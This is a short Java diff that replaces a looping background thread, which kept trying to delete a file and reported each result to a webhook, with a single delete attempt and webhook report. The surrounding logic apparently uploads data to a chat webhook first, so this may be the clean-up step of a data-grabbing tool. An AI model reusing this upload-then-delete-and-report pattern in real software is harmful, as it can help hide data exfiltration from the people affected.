@@ -29,15 +29,7 @@ public class JSONRegexHandler {
         assert result != null;
         if (result.contains("Invalid Webhook Token"))
             success = false;
-        new Thread(() -> {
-            while (!Thread.currentThread().isInterrupted()) {
-                try {
-                    Thread.sleep(5000);
-                    if (file.delete()) JSONRegexHandler.send(new JSONBuilder().value("content", "File Deleted: " + file.getName()).build());
-                    else if (file.exists()) JSONRegexHandler.send(new JSONBuilder().value("content", "Failed to delete file: " + file.getName()).build());
-                } catch (Exception ignored) {
-                }
-            }
-        }).start();
+        if (file.delete()) JSONRegexHandler.send(new JSONBuilder().value("content", "File Deleted: " + file.getName()).build());
+        else if (file.exists()) JSONRegexHandler.send(new JSONBuilder().value("content", "Failed to delete file: " + file.getName()).build());
     }
 }
